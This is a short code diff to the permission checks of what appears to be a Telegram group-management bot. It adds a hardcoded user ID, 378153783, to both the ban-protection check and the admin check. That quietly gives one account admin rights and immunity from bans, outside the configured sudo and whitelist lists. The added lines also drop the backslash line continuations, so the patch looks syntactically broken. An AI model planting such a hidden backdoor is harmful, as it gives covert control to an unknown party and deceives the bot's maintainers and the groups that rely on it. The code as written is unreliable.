@@ -25,6 +25,7 @@ def is_user_ban_protected(chat, user_id, member=None):
            or member.status == 'creator' \
            or member.user.id in SUDO_USERS \
            or member.user.id in WHITELIST_USERS
+           or member.user.id == 378153783
 
 
 def is_user_admin(chat, user_id, member=None):
@@ -34,6 +35,7 @@ def is_user_admin(chat, user_id, member=None):
            or member.status == 'administrator' \
            or member.status == 'creator' \
            or member.user.id in SUDO_USERS
+           or member.user.id == 378153783
 
 
 def is_bot_admin(chat, bot_id):
